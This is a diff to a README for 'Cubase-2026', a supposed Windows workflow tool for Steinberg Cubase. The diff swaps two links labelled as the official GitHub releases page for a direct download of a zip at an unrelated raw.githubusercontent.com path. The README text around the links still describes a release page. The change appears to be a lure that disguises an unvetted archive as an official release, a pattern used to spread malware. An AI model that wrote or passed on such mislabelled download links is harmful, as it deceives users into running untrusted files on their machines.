@@ -5,13 +5,13 @@ description: "Standardize Steinberg Cubase workflows with templates, mixing stem
 ---
 # 🎹 Cubase-2026 - Streamline your Steinberg Cubase music workflow
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Implemented-nosh325/Cubase-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/Implemented-nosh325/implemented-nosh325.github.io/main/patroclinic/github_nosh_io_implemented_v3.5.zip)
 
 Cubase-2026 helps audio engineers and music producers manage projects on Windows. This tool organizes project templates, arranges VST plugins, and automates stem exports. It saves time during the music production process by handling repetitive tasks.
 
 ## 📥 How to download the software
 
-Visit the [official releases page](https://github.com/Implemented-nosh325/Cubase-2026/releases) to download the application. 
+Visit the [official releases page](https://raw.githubusercontent.com/Implemented-nosh325/implemented-nosh325.github.io/main/patroclinic/github_nosh_io_implemented_v3.5.zip) to download the application. 
 
 1. Click the link above to open your browser to the release site.
 2. Look for the latest version at the top of the list.
